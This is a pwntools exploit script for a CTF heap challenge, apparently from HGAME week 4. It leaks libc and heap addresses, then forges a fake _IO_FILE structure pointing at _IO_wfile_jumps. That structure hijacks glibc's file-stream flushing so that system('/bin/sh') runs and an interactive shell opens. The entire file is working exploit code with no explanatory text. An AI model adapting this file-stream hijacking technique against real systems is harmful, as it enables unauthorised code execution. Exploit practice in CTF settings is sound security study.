from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./ld-linux-x86-64.so.2", "./vuln.bak"], env={"LD_PRELOAD":"./libc.so.6"})
# sh = remote("week-4.hgame.lwsec.cn", 32758)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6")

sh.recvuntil(b"the box of it looks like this: ")
libc_base = int(sh.recvuntil(b"\n", drop=True), 16) - 0x1f7660
heap_base = libc_base - 0xb2d08ff0
_io_wfile_jumps_addr = libc_base + libc.sym['_IO_wfile_jumps']
system_addr = libc_base + libc.sym['system']
print(hex(libc_base))
print(hex(heap_base))

sh.sendlineafter(b"How many things do you think is appropriate to put into the gift?", b'3000000000')  # 0xb2d08ff0
gdb.attach(sh, 'b *$rebase(0x1285)\nb _IO_switch_to_wget_mode\n b _IO_flush_all_lockp')
pause(3)

fake_IO_FILE = b'/bin/sh'.ljust(8, b'\x00')         #_flags=rdi
fake_IO_FILE += p64(0)*7
fake_IO_FILE += p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE += p64(0x41414141)#_IO_backup_base=rdx
fake_IO_FILE += p64(system_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
fake_IO_FILE += p64(heap_base+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE +=p64(heap_base+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
fake_IO_FILE += p64(_io_wfile_jumps_addr + 0x30)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(heap_base+0x40)  # rax2_addr
fake_IO_FILE += p64(0)
fake_IO_FILE += b'/bin/sh\x00\x00'
sh.sendafter(b"What do you think is appropriate to put into the gitf?", fake_IO_FILE)
sh.interactive()